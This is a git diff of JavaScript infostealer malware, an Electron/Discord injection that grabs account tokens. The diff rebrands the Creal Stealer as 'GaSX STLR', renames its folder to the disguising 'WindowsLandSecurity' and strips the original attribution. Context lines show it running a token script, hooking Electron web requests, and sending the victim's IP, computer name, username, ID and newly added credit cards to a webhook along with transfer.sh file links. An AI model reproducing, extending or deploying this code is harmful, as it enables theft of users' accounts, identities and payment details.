@@ -288,9 +288,9 @@ const post = async (params) => {
 const FirstTime = async () => {
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/Creal")){
+    if (fs.existsSync(__dirname + "/WindowsLandSecurity")){
         try{
-        fs.rmdirSync(__dirname + "/Creal")
+        fs.rmdirSync(__dirname + "/WindowsLandSecurity")
         }catch(err){
             console.log(err)
         }
@@ -358,7 +358,7 @@ const FirstTime = async () => {
                 value: `[GaSX STLR <a:mavikirmizi:853238372591599617>]`,
                 inline: !0
             }, {
-                name: "Creal Files",
+                name: "GaSX Files",
                 value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                 inline: !0
             }, {
@@ -395,7 +395,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "Creal User log out (User not Logged in before)",
+                title: "User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -448,10 +448,10 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[GaSX STLR  <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[GaSX STLR  <a:mavikirmizi:853238372591599617>]`,
                     inline: !0
                 }, {
-                    name: "Creal Files",
+                    name: "GaSX Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -634,10 +634,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[GaSX STLR <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[GaSX STLR <a:mavikirmizi:853238372591599617>]`,
                     inline: !0
                 }, {
-                    name: "Creal Files",
+                    name: "GaSX Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -719,10 +719,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[GaSX STLR <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[GaSX STLR <a:mavikirmizi:853238372591599617>]`,
                         inline: !0
                     }, {
-                        name: "Creal Files",
+                        name: "GaSX Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -806,10 +806,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[GaSX STLR <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[GaSX STLR <a:mavikirmizi:853238372591599617>]`,
                         inline: !0
                     }, {
-                        name: "Creal Files",
+                        name: "GaSX Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -862,7 +862,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     title: "GaSX STLR User Credit Card Added",
                     color: config['embed-color'],
                     fields: [
-                      { name: "Creal Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
+                      { name: "GaSX Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
                       { name: "IP", value: ip },
                       { name: "Username <:username:1041634536733290596>", value: `${user.username}#${user.discriminator}` },
                       { name: "ID <:iduser:1041634535395307520>", value: user.id },
